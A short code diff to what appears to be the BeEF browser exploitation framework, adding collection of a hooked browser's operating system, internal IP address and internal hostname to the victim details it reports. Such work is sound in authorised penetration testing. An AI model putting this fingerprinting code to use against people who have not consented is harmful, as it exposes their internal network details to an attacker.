@@ -330,6 +330,9 @@ beef.browser = {
 		var page_title = document.title;
 		var hostname = document.location.hostname;
 		var browser_plugins = beef.browser.getPlugins();
+		var os_name = beef.os.getName();
+		var internal_ip = beef.net.local.getLocalAddress();
+		var internal_hostname = beef.net.local.getLocalHostname();
 		
 		if(browser_name) details["BrowserName"] = browser_name;
 		if(browser_version) details["BrowserVersion"] = browser_version;
@@ -337,6 +340,9 @@ beef.browser = {
 		if(page_title) details["PageTitle"] = page_title;
 		if(hostname) details["HostName"] = hostname;
 		if(browser_plugins) details["BrowserPlugins"] = browser_plugins;
+		if(os_name) details['OsName'] = os_name;
+		if(internal_ip) details['InternalIP'] = internal_ip;
+		if(internal_hostname) details['InternalHostname'] = internal_hostname;
 		
 		return details;
 	},
